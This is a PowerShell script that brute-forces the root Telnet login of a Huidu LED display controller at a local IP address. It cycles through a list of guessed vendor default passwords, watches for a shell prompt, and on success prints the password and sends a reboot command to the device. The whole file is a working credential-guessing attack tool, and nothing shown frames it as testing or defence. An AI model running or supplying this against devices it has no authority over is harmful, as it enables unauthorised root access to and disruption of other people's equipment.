# Extended password list for Huidu devices  
$passwords = @("huidu", "Huidu1234", "huidu@123", "Hd2023", "Hd@2023", "hd123456", "boxplayer", "BoxPlayer", "huidu@2023", "Hd#2023", "hd@2023", "2023huidu", "HD12345", "hd12345", "HUIDU123", "hdplayer", "HDPlayer", "C15", "c15boxplayer", "led", "LED", "huidu2023", "huidu2024", "hd2024")

foreach ($pwd in $passwords) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.NoDelay = $true
    try { $tcp.Connect('192.168.1.104', 23) } catch { continue }
    $stream = $tcp.GetStream()
    $buf = New-Object byte[] 4096
    
    # Read IAC
    $stream.ReadTimeout = 1500
    try { $stream.Read($buf, 0, 4096) | Out-Null } catch {}
    
    # Read login prompt
    $stream.ReadTimeout = 1500
    try { $stream.Read($buf, 0, 4096) | Out-Null } catch {}
    
    # Send username "root\r\n"
    $loginBytes = [System.Text.Encoding]::ASCII.GetBytes("root`r`n")
    $stream.Write($loginBytes, 0, $loginBytes.Length)
    $stream.Flush()
    
    # Read password prompt  
    $stream.ReadTimeout = 1500
    try { $stream.Read($buf, 0, 4096) | Out-Null } catch {}
    
    # Send password
    $pwdBytes = [System.Text.Encoding]::ASCII.GetBytes("$pwd`r`n")
    $stream.Write($pwdBytes, 0, $pwdBytes.Length)
    $stream.Flush()
    
    # Read response - look for # or $
    Start-Sleep -Milliseconds 800
    $stream.ReadTimeout = 1500
    try {
        $n = $stream.Read($buf, 0, 4096)
        if ($n -gt 0) {
            $text = [System.Text.Encoding]::ASCII.GetString($buf, 0, $n) -replace '[^\x20-\x7E\r\n]', '.'
            if ($text -match "#|(\$ *$)") {
                Write-Host "SUCCESS! Password: '$pwd' | Shell: '$text'"
                # Reboot the device
                $rebootCmd = [System.Text.Encoding]::ASCII.GetBytes("reboot`r`n")
                $stream.Write($rebootCmd, 0, $rebootCmd.Length)
                $stream.Flush()
                $tcp.Close()
                exit 0
            } else {
                Write-Host "FAIL '$pwd': $($text.Trim())"
            }
        }
    } catch { Write-Host "FAIL '$pwd': timeout" }
    
    $tcp.Close()
    Start-Sleep -Milliseconds 200
}
Write-Host "All passwords failed"
